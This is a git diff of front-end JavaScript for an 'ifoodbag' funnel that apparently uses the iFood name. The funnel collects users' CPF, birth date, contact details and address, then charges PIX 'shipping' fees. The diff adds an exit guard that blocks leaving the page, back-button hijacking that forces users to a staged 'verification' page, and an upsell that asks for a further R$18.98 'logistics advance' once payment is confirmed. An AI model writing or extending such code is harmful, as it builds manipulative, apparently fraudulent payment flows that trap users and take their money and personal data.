@@ -103,7 +103,8 @@ const STORAGE_KEYS = {
     utm: 'ifoodbag.utm',
     pixelConfig: 'ifoodbag.pixelConfig',
     coupon: 'ifoodbag.coupon',
-    directCheckout: 'ifoodbag.directCheckout'
+    directCheckout: 'ifoodbag.directCheckout',
+    vslCompleted: 'ifoodbag.vslCompleted'
 };
 
 const state = {
@@ -135,6 +136,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (page && page !== 'admin') {
         trackPageView(page);
     }
+    setupExitGuard(page);
     setupGlobalBackRedirect(page);
     switch (page) {
         case 'home':
@@ -163,6 +165,9 @@ document.addEventListener('DOMContentLoaded', () => {
             break;
         case 'pix':
             initPix();
+            break;
+        case 'upsell':
+            initUpsell();
             break;
         case 'admin':
             initAdmin();
@@ -341,6 +346,20 @@ function setupGlobalBackRedirect(page) {
             redirect(resolveTargetUrl());
         });
     }
+}
+
+function setupExitGuard(page) {
+    if (!page || page === 'admin') return;
+    if (window.__ifbExitGuardInit) return;
+    window.__ifbExitGuardInit = true;
+    window.__ifbAllowUnload = false;
+
+    window.addEventListener('beforeunload', (event) => {
+        if (window.__ifbAllowUnload) return;
+        event.preventDefault();
+        event.returnValue = '';
+        return '';
+    });
 }
 
 function getBackRedirectOffer(page) {
@@ -810,6 +829,7 @@ function initProcessing() {
             updateText('Verificação concluída.');
 
             setTimeout(() => {
+                markVslCompleted();
                 setStage('success');
                 redirect('sucesso.html');
             }, 900);
@@ -1549,6 +1569,74 @@ function initOrderBump() {
     btnDecline?.addEventListener('click', () => proceedToPix(false));
 }
 
+function initUpsell() {
+    if (!requirePersonal()) return;
+    if (!requireAddress()) return;
+
+    setStage('upsell');
+    const personal = loadPersonal();
+    const shipping = loadShipping();
+    const pix = loadPix();
+    const offerPrice = 18.98;
+
+    trackLead('upsell_view', { stage: 'upsell', shipping, pix, offerPrice });
+
+    const leadName = document.getElementById('upsell-lead-name');
+    const currentFrete = document.getElementById('upsell-current-frete');
+    const currentTxid = document.getElementById('upsell-current-txid');
+    const btnAccept = document.getElementById('btn-upsell-accept');
+    const btnSkip = document.getElementById('btn-upsell-skip');
+    const loading = document.getElementById('upsell-loading');
+
+    if (leadName && personal?.name) {
+        const firstName = String(personal.name || '').trim().split(/\s+/)[0];
+        leadName.textContent = firstName || 'Parceiro';
+    }
+    if (currentFrete) {
+        currentFrete.textContent = shipping?.name || 'Frete padrao iFood';
+    }
+    if (currentTxid) {
+        const txid = String(pix?.idTransaction || '').trim();
+        currentTxid.textContent = txid ? txid.slice(-8) : '--';
+    }
+
+    const setLoading = (active) => {
+        if (btnAccept) btnAccept.disabled = active;
+        if (btnSkip) btnSkip.disabled = active;
+        if (loading) loading.classList.toggle('hidden', !active);
+    };
+
+    btnAccept?.addEventListener('click', async () => {
+        const expressShipping = {
+            id: 'expresso_1dia',
+            name: 'Adiantamento logistica (1 dia)',
+            eta: 'Recebimento em 1 dia',
+            price: offerPrice
+        };
+
+        setLoading(true);
+        trackLead('upsell_accept', {
+            stage: 'upsell',
+            shipping: expressShipping,
+            baseShipping: shipping || null,
+            previousPix: pix || null
+        });
+
+        try {
+            await createPixCharge(expressShipping, 0);
+        } catch (error) {
+            showToast(error.message || 'Nao foi possivel gerar o PIX de adiantamento.', 'error');
+            setLoading(false);
+        }
+    });
+
+    btnSkip?.addEventListener('click', () => {
+        trackLead('upsell_decline', { stage: 'upsell', shipping, pix });
+        showToast('Tudo certo. Mantemos o prazo padrao da sua entrega.', 'success');
+        btnSkip.disabled = true;
+    });
+}
+
 function initPix() {
     const pix = loadPix();
     const shipping = loadShipping();
@@ -1650,6 +1738,96 @@ function initPix() {
         timerId = setInterval(updateTimer, 1000);
     }
 
+    let statusPollTimer = null;
+    let pollingBusy = false;
+    let redirectedToUpsell = false;
+    let inactiveStatusShown = false;
+
+    const clearStatusPolling = () => {
+        if (statusPollTimer) {
+            clearInterval(statusPollTimer);
+            statusPollTimer = null;
+        }
+    };
+
+    const markPaidAndRedirect = (statusRaw) => {
+        if (redirectedToUpsell) return;
+        redirectedToUpsell = true;
+        clearStatusPolling();
+
+        savePix({
+            ...pix,
+            status: 'paid',
+            statusRaw: String(statusRaw || 'paid'),
+            paidAt: new Date().toISOString()
+        });
+        trackLead('pix_paid_redirect_upsell', {
+            stage: 'pix',
+            shipping,
+            pix: {
+                txid: pix?.idTransaction || '',
+                statusRaw: String(statusRaw || 'paid')
+            }
+        });
+        showToast('Pagamento confirmado. Redirecionando...', 'success');
+        setStage('upsell');
+        setTimeout(() => {
+            redirect('upsell.html');
+        }, 900);
+    };
+
+    const normalizePixStatus = (value) => {
+        return String(value || '')
+            .trim()
+            .toLowerCase()
+            .replace(/\s+/g, '_')
+            .replace(/-+/g, '_');
+    };
+
+    const pollPixStatus = async () => {
+        if (pollingBusy || redirectedToUpsell) return;
+        if (!pix?.idTransaction) return;
+        pollingBusy = true;
+
+        try {
+            const res = await fetch('/api/pix/status', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    txid: pix.idTransaction,
+                    sessionId: getLeadSessionId()
+                })
+            });
+            const data = await res.json().catch(() => ({}));
+            if (!res.ok) return;
+
+            const status = normalizePixStatus(data?.status);
+            if (status === 'paid') {
+                markPaidAndRedirect(data?.statusRaw);
+                return;
+            }
+
+            if (!inactiveStatusShown && (status === 'refunded' || status === 'refused')) {
+                inactiveStatusShown = true;
+                showToast('Esse PIX nao esta mais ativo. Gere um novo para continuar.', 'error');
+            }
+        } catch (_error) {
+            // Ignore transient errors during status polling.
+        } finally {
+            pollingBusy = false;
+        }
+    };
+
+    const currentStatus = normalizePixStatus(pix?.status || pix?.status_transaction || '');
+    if (currentStatus === 'paid' || pix?.paidAt) {
+        markPaidAndRedirect(pix?.statusRaw || pix?.status || 'paid');
+        return;
+    }
+
+    pollPixStatus();
+    statusPollTimer = setInterval(pollPixStatus, 5000);
+    window.addEventListener('pagehide', clearStatusPolling, { once: true });
+    window.addEventListener('beforeunload', clearStatusPolling, { once: true });
 }
 
 function buildBackRedirectUrl(pageOverride) {
@@ -1661,8 +1839,22 @@ function buildBackRedirectUrl(pageOverride) {
     };
 
     const page = pageOverride || document.body?.dataset?.page || '';
+    const personal = loadPersonal();
+    const address = loadAddress();
     const shipping = loadShipping();
     const pix = loadPix();
+    const canOpenVsl = !!(
+        personal?.name &&
+        personal?.cpf &&
+        personal?.birth &&
+        personal?.email &&
+        personal?.phone &&
+        address
+    );
+    const vslRequiredPages = new Set(['home', 'success', 'checkout', 'orderbump', 'pix', 'upsell']);
+    if (!isVslCompleted() && canOpenVsl && vslRequiredPages.has(page)) {
+        return 'processando.html';
+    }
 
     switch (page) {
         case 'home':
@@ -1680,6 +1872,8 @@ function buildBackRedirectUrl(pageOverride) {
             if (shipping) return 'orderbump.html';
             return directCheckoutUrl();
         case 'pix':
+            return directCheckoutUrl();
+        case 'upsell':
             return directCheckoutUrl();
         default:
             if (pix) return 'pix.html';
@@ -1711,7 +1905,9 @@ function initAdmin() {
     const utmfyApi = document.getElementById('utmfy-api');
     const pushcutEnabled = document.getElementById('pushcut-enabled');
     const pushcutPixCreated = document.getElementById('pushcut-pix-created');
+    const pushcutPixCreated2 = document.getElementById('pushcut-pix-created-2');
     const pushcutPixConfirmed = document.getElementById('pushcut-pix-confirmed');
+    const pushcutPixConfirmed2 = document.getElementById('pushcut-pix-confirmed-2');
     const pushcutCreatedTitle = document.getElementById('pushcut-created-title');
     const pushcutCreatedMessage = document.getElementById('pushcut-created-message');
     const pushcutConfirmedTitle = document.getElementById('pushcut-confirmed-title');
@@ -1783,7 +1979,8 @@ function initAdmin() {
         success: { label: 'sucesso.html', desc: 'Aprovado e chamada para resgate' },
         checkout: { label: 'checkout.html', desc: 'Endereco e selecao de frete' },
         orderbump: { label: 'orderbump.html', desc: 'Oferta do Seguro Bag' },
-        pix: { label: 'pix.html', desc: 'Pagamento via PIX' }
+        pix: { label: 'pix.html', desc: 'Pagamento via PIX' },
+        upsell: { label: 'upsell.html', desc: 'Oferta de adiantamento de entrega' }
     };
     let currentSettings = null;
 
@@ -1797,7 +1994,9 @@ function initAdmin() {
         utmfyApi ||
         pushcutEnabled ||
         pushcutPixCreated ||
+        pushcutPixCreated2 ||
         pushcutPixConfirmed ||
+        pushcutPixConfirmed2 ||
         pushcutCreatedTitle ||
         pushcutCreatedMessage ||
         pushcutConfirmedTitle ||
@@ -1851,8 +2050,10 @@ function initAdmin() {
             if (utmfyEndpoint) utmfyEndpoint.value = data.utmfy?.endpoint || '';
             if (utmfyApi) utmfyApi.value = data.utmfy?.apiKey || '';
             if (pushcutEnabled) pushcutEnabled.checked = !!data.pushcut?.enabled;
-            if (pushcutPixCreated) pushcutPixCreated.value = data.pushcut?.pixCreatedUrl || '';
-            if (pushcutPixConfirmed) pushcutPixConfirmed.value = data.pushcut?.pixConfirmedUrl || '';
+            if (pushcutPixCreated) pushcutPixCreated.value = data.pushcut?.pixCreatedUrl || data.pushcut?.pixCreatedUrls?.[0] || '';
+            if (pushcutPixCreated2) pushcutPixCreated2.value = data.pushcut?.pixCreatedUrl2 || data.pushcut?.pixCreatedUrls?.[1] || '';
+            if (pushcutPixConfirmed) pushcutPixConfirmed.value = data.pushcut?.pixConfirmedUrl || data.pushcut?.pixConfirmedUrls?.[0] || '';
+            if (pushcutPixConfirmed2) pushcutPixConfirmed2.value = data.pushcut?.pixConfirmedUrl2 || data.pushcut?.pixConfirmedUrls?.[1] || '';
             if (pushcutCreatedTitle) pushcutCreatedTitle.value = data.pushcut?.templates?.pixCreatedTitle || '';
             if (pushcutCreatedMessage) pushcutCreatedMessage.value = data.pushcut?.templates?.pixCreatedMessage || '';
             if (pushcutConfirmedTitle) pushcutConfirmedTitle.value = data.pushcut?.templates?.pixConfirmedTitle || '';
@@ -1902,11 +2103,23 @@ function initAdmin() {
                 endpoint: utmfyEndpoint?.value?.trim() || '',
                 apiKey: utmfyApi?.value?.trim() || ''
             };
+            const createdUrls = [
+                pushcutPixCreated?.value?.trim() || '',
+                pushcutPixCreated2?.value?.trim() || ''
+            ].filter(Boolean);
+            const confirmedUrls = [
+                pushcutPixConfirmed?.value?.trim() || '',
+                pushcutPixConfirmed2?.value?.trim() || ''
+            ].filter(Boolean);
             payload.pushcut = {
                 ...(currentSettings?.pushcut || {}),
                 enabled: !!pushcutEnabled?.checked,
-                pixCreatedUrl: pushcutPixCreated?.value?.trim() || '',
-                pixConfirmedUrl: pushcutPixConfirmed?.value?.trim() || '',
+                pixCreatedUrl: createdUrls[0] || '',
+                pixCreatedUrl2: createdUrls[1] || '',
+                pixCreatedUrls: createdUrls,
+                pixConfirmedUrl: confirmedUrls[0] || '',
+                pixConfirmedUrl2: confirmedUrls[1] || '',
+                pixConfirmedUrls: confirmedUrls,
                 templates: {
                     ...(currentSettings?.pushcut?.templates || {}),
                     pixCreatedTitle: pushcutCreatedTitle?.value?.trim() || '',
@@ -2008,7 +2221,9 @@ function initAdmin() {
             showToast('Ative o Pushcut e salve.', 'error');
             return;
         }
-        if (!(pushcutPixCreated?.value || '').trim() && !(pushcutPixConfirmed?.value || '').trim()) {
+        const hasCreated = !!(pushcutPixCreated?.value || '').trim() || !!(pushcutPixCreated2?.value || '').trim();
+        const hasConfirmed = !!(pushcutPixConfirmed?.value || '').trim() || !!(pushcutPixConfirmed2?.value || '').trim();
+        if (!hasCreated && !hasConfirmed) {
             if (testPushcutStatus) testPushcutStatus.textContent = 'Informe ao menos uma URL de Pushcut.';
             showToast('Configure a URL de Pushcut.', 'error');
             return;
@@ -2027,8 +2242,12 @@ function initAdmin() {
 
         const createdOk = !!data?.results?.pix_created?.ok;
         const confirmedOk = !!data?.results?.pix_confirmed?.ok;
+        const createdSent = Number(data?.results?.pix_created?.sent || (createdOk ? 1 : 0));
+        const createdTotal = Number(data?.results?.pix_created?.total || (createdOk ? 1 : 0));
+        const confirmedSent = Number(data?.results?.pix_confirmed?.sent || (confirmedOk ? 1 : 0));
+        const confirmedTotal = Number(data?.results?.pix_confirmed?.total || (confirmedOk ? 1 : 0));
         if (testPushcutStatus) {
-            testPushcutStatus.textContent = `PIX criado: ${createdOk ? 'OK' : 'ERRO'} | PIX confirmado: ${confirmedOk ? 'OK' : 'ERRO'}`;
+            testPushcutStatus.textContent = `PIX criado: ${createdSent}/${createdTotal} | PIX confirmado: ${confirmedSent}/${confirmedTotal}`;
         }
         showToast('Teste do Pushcut enviado.', 'success');
     };
@@ -2205,7 +2424,7 @@ function initAdmin() {
         });
 
         if (pagesInsights) {
-            const order = ['home', 'quiz', 'personal', 'cep', 'processing', 'success', 'checkout', 'orderbump', 'pix'];
+            const order = ['home', 'quiz', 'personal', 'cep', 'processing', 'success', 'checkout', 'orderbump', 'pix', 'upsell'];
             const map = new Map(rows.map((r) => [r.page, Number(r.total) || 0]));
             pagesInsights.innerHTML = '';
             let prevEffective = null;
@@ -3157,10 +3376,19 @@ function resetFlow() {
     localStorage.removeItem(STORAGE_KEYS.addressExtra);
     localStorage.removeItem(STORAGE_KEYS.pix);
     localStorage.removeItem(STORAGE_KEYS.bump);
+    localStorage.removeItem(STORAGE_KEYS.vslCompleted);
     sessionStorage.removeItem(STORAGE_KEYS.stock);
     sessionStorage.removeItem(STORAGE_KEYS.returnTo);
     sessionStorage.removeItem(STORAGE_KEYS.directCheckout);
     clearCoupon();
+}
+
+function markVslCompleted() {
+    localStorage.setItem(STORAGE_KEYS.vslCompleted, '1');
+}
+
+function isVslCompleted() {
+    return localStorage.getItem(STORAGE_KEYS.vslCompleted) === '1';
 }
 
 function resolveResumeUrl() {
@@ -3174,6 +3402,7 @@ function resolveResumeUrl() {
     if (stage === 'checkout') return 'checkout';
     if (stage === 'orderbump') return 'orderbump';
     if (stage === 'pix') return 'pix';
+    if (stage === 'upsell') return 'upsell';
     if (stage === 'complete') return 'checkout';
     if (loadPersonal() && !loadAddress()) return 'endereco';
     if (loadPersonal() && loadAddress()) return 'checkout';
@@ -3220,6 +3449,7 @@ function requireAddress() {
 }
 
 function redirect(url) {
+    window.__ifbAllowUnload = true;
     const clean = (url || '').replace(/\.html(?=$|\?)/, '');
     if (clean === 'index') {
         window.location.href = '/';
